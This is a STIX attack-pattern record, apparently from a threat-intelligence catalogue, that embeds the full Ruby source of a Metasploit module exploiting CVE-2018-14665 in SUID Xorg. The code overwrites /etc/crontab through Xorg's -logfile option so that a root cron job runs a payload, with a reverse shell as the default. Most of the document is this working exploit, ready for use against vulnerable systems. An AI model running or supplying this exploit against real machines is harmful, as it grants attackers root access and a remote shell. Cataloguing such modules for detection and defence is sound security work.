{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--15508676-3e28-4b9e-b2a6-50217007f280",
    "created": "2024-08-14T17:07:04.29578Z",
    "modified": "2024-08-14T17:07:04.295784Z",
    "name": "Xorg X11 Server SUID logfile Privilege Escalation",
    "description": " This module attempts to gain root privileges with SUID Xorg X11 server versions 1.19.0 < 1.20.3.  A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges.  This module has been tested with OpenBSD 6.3, 6.4, CentOS 7.4.1708, and CentOS 7.5.1804, and RHEL 7.5. The default PAM configuration for CentOS and RHEL systems requires console auth for the user's session to start the Xorg server.  Cron launches the payload, so if SELinux is enforcing, exploitation may still be possible, but the module will bail.  Xorg must have SUID permissions and may not start if already running.  On exploitation a crontab.old backup file will be created by Xorg. This module will remove the .old file and restore crontab after successful exploitation. Failed exploitation may result in a corrupted crontab. On successful exploitation artifacts will be created consistant with starting Xorg and running a cron.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/local/xorg_x11_suid_server.rb",
            "external_id": "xorg_x11_suid_server.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-14665"
        },
        {
            "source_name": "reference",
            "url": "https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Kernel\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Xorg X11 Server SUID logfile Privilege Escalation',\n        'Description' => %q{\n          This module attempts to gain root privileges with SUID Xorg X11 server\n          versions 1.19.0 < 1.20.3.\n\n          A permission check flaw exists for -modulepath and -logfile options when\n          starting Xorg. This allows unprivileged users that can start the server\n          the ability to elevate privileges and run arbitrary code under root\n          privileges.\n\n          This module has been tested with OpenBSD 6.3, 6.4, CentOS 7.4.1708, and\n          CentOS 7.5.1804, and RHEL 7.5. The default PAM configuration for CentOS\n          and RHEL systems requires console auth for the user's session to start\n          the Xorg server.\n\n          Cron launches the payload, so if SELinux is enforcing, exploitation\n          may still be possible, but the module will bail.\n\n          Xorg must have SUID permissions and may not start if already running.\n\n          On exploitation a crontab.old backup file will be created by Xorg.\n          This module will remove the .old file and restore crontab after\n          successful exploitation. Failed exploitation may result in a corrupted\n          crontab. On successful exploitation artifacts will be created consistant\n          with starting Xorg and running a cron.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Narendra Shinde', # Discovery and exploit\n          'Raptor - 0xdea',  # Modified exploit for cron\n          'Aaron Ringo',     # Metasploit module\n          'bcoles'           # Metasploit module\n        ],\n        'DisclosureDate' => '2018-10-25',\n        'References' => [\n          [ 'CVE', '2018-14665' ],\n          [ 'BID', '105741' ],\n          [ 'EDB', '45697' ],\n          [ 'EDB', '45742' ],\n          [ 'EDB', '45832' ],\n          [ 'URL', 'https://www.securepatterns.com/2018/10/cve-2018-14665-xorg-x-server.html' ],\n          [ 'URL', 'https://github.com/0xdea/exploits/blob/master/openbsd/raptor_xorgasm' ]\n        ],\n        'Platform' => %w[openbsd linux],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'SessionTypes' => %w[shell meterpreter],\n        'Targets' => [\n          [\n            'OpenBSD', {\n              'Platform' => 'unix',\n              'Arch' => [ ARCH_CMD ]\n            }\n          ],\n          [\n            'Linux x64', {\n              'Platform' => 'linux',\n              'Arch' => [ ARCH_X64 ]\n            }\n          ],\n          [\n            'Linux x86', {\n              'Platform' => 'linux',\n              'Arch' => [ ARCH_X86 ]\n            }\n          ]\n        ],\n        'DefaultOptions' => {\n          'PAYLOAD' => 'cmd/unix/reverse_openssl',\n          'WfsDelay' => 120\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Reliability' => [ UNRELIABLE_SESSION ],\n          'Stability' => [ CRASH_SERVICE_DOWN ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, CONFIG_CHANGES ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ]),\n        OptString.new('Xdisplay', [ true, 'Display exploit will attempt to use', ':1' ]),\n        OptBool.new('ConsoleLock', [ true, 'Will check for console lock on linux systems', true ])\n      ]\n    )\n  end\n\n  def check\n    # linux checks\n    uname = cmd_exec('uname')\n    if uname =~ /linux/i\n      vprint_status 'Running additional check for Linux'\n      if datastore['ConsoleLock']\n        user = cmd_exec('id -un')\n        unless exist?(\"/var/run/console/#{user}\")\n          vprint_error(\"No console lock for #{user}\")\n          return CheckCode::Safe\n        end\n        vprint_good(\"Console lock for #{user}\")\n      end\n\n      return CheckCode::Safe('SELinux is enforcing') if selinux_installed? && selinux_enforcing?\n\n      vprint_good('SELinux is not an issue')\n    end\n\n    # suid program check\n    xorg_path = cmd_exec('command -v Xorg')\n    unless xorg_path.include?('Xorg')\n      return CheckCode::Safe('Could not find Xorg executable')\n    end\n\n    vprint_good(\"Xorg path found at #{xorg_path}\")\n\n    unless setuid?(xorg_path)\n      return CheckCode::Safe(\"Xorg binary #{xorg_path} is not SUID\")\n    end\n\n    vprint_good(\"Xorg binary #{xorg_path} is SUID\")\n\n    # version check\n    x_version = cmd_exec 'Xorg -version'\n    if x_version.include?('Release Date')\n      v = Rex::Version.new(x_version.scan(/\\d\\.\\d+\\.\\d+/).first)\n      unless v.between?(Rex::Version.new('1.19.0'), Rex::Version.new('1.20.2'))\n        vprint_error \"Xorg version #{v} not supported\"\n        return CheckCode::Safe\n      end\n    elsif x_version.include?('Fatal server error')\n      vprint_error 'User probably does not have console auth'\n      vprint_error 'Below is Xorg -version output'\n      vprint_error x_version\n      return CheckCode::Safe\n    else\n      vprint_warning('Could not parse Xorg -version output')\n      return CheckCode::Appears\n    end\n    vprint_good(\"Xorg version #{v} is vulnerable\")\n\n    # process check for /X\n    proc_list = cmd_exec 'ps ax'\n    if proc_list.include?('/X ')\n      vprint_warning('Xorg in process list')\n      return CheckCode::Appears\n    end\n    vprint_good('Xorg does not appear running')\n    return CheckCode::Vulnerable\n  end\n\n  def on_new_session(session)\n    if session.type.to_s.eql? 'meterpreter'\n      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'\n      session.sys.process.execute '/bin/sh', \"-c \\\"#{@clean_up}\\\"\"\n    else\n      session.shell_command(@clean_up)\n    end\n    print_good 'Returning session after cleaning'\n  ensure\n    super\n  end\n\n  def exploit\n    check_status = check\n    if check_status == CheckCode::Appears\n      print_warning 'Could not get version or Xorg process possibly running, may fail'\n    elsif check_status == CheckCode::Safe\n      fail_with Failure::NotVulnerable, 'Target not vulnerable'\n    end\n\n    if is_root?\n      fail_with Failure::BadConfig, 'This session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    print_good 'Passed all initial checks for exploit'\n\n    pscript = \"#{datastore['WritableDir']}/.session-#{rand_text_alphanumeric 5..10}\"\n    @clean_up = \"/bin/cat #{pscript}.b > /etc/crontab ; /bin/rm -f #{pscript}.b /etc/crontab.old\"\n    xdisplay = datastore['Xdisplay']\n\n    # Uploading file crontab will run\n    print_status 'Uploading your payload, this could take a while'\n    if payload.arch.first == 'cmd'\n      write_file(pscript, payload.encoded)\n    else\n      write_file(pscript, generate_payload_exe)\n    end\n    register_file_for_cleanup pscript\n    chmod pscript\n\n    # Exploit steps on crontab so backing it up\n    cmd_exec \"cat /etc/crontab > #{pscript}.b\"\n    # Actual exploit with cron overwrite\n    print_status 'Trying /etc/crontab overwrite'\n    cmd_exec \"cd /etc ; Xorg -fp '* * * * * root #{pscript}' -logfile crontab #{xdisplay} & >/dev/null\"\n    Rex.sleep 5\n    cmd_exec 'pkill Xorg'\n    Rex.sleep 1\n    cron_check = cmd_exec \"grep -F #{pscript} /etc/crontab\"\n    unless cron_check.include? pscript\n      rm_f \"#{pscript}.b\"\n      print_error 'Deleting crontab backup'\n      fail_with Failure::NotVulnerable, '/etc/crontab not modified'\n    end\n    print_good '/etc/crontab overwrite successful. Waiting for job to run (may take a minute)...'\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-25",
    "x_mitre_platforms": [
        "linux'"
    ]
}